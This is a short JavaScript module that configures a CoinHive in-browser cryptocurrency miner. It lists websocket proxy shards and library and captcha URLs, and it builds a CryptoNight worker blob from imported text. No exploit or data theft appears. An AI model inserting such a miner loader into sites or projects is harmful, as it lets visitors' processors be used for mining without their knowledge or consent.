import txt from './blob.txt.js';
import {CoinHive, URL, WebAssembly} from './coinhive.js';

self.CoinHive = self.CoinHive || {};
self.CoinHive.CONFIG = {
  LIB_URL: "https://coin-hive.com/lib/",
  WEBSOCKET_SHARDS: [
    ["wss://ws001.coin-hive.com/proxy", "wss://ws002.coin-hive.com/proxy", "wss://ws003.coin-hive.com/proxy", "wss://ws004.coin-hive.com/proxy", "wss://ws005.coin-hive.com/proxy", "wss://ws006.coin-hive.com/proxy", "wss://ws007.coin-hive.com/proxy"],
    ["wss://ws008.coin-hive.com/proxy", "wss://ws009.coin-hive.com/proxy", "wss://ws009.coin-hive.com/proxy", "wss://ws010.coin-hive.com/proxy", "wss://ws011.coin-hive.com/proxy", "wss://ws012.coin-hive.com/proxy", "wss://ws013.coin-hive.com/proxy"],
    ["wss://ws014.coin-hive.com/proxy", "wss://ws015.coin-hive.com/proxy", "wss://ws016.coin-hive.com/proxy", "wss://ws017.coin-hive.com/proxy", "wss://ws018.coin-hive.com/proxy", "wss://ws019.coin-hive.com/proxy", "wss://ws020.coin-hive.com/proxy"],
    ["wss://ws021.coin-hive.com/proxy", "wss://ws022.coin-hive.com/proxy", "wss://ws023.coin-hive.com/proxy", "wss://ws024.coin-hive.com/proxy", "wss://ws025.coin-hive.com/proxy", "wss://ws026.coin-hive.com/proxy"]
  ],
  CAPTCHA_URL: "https://coin-hive.com/captcha/"
};
CoinHive.CRYPTONIGHT_WORKER_BLOB = URL.createObjectURL(new Blob([txt]));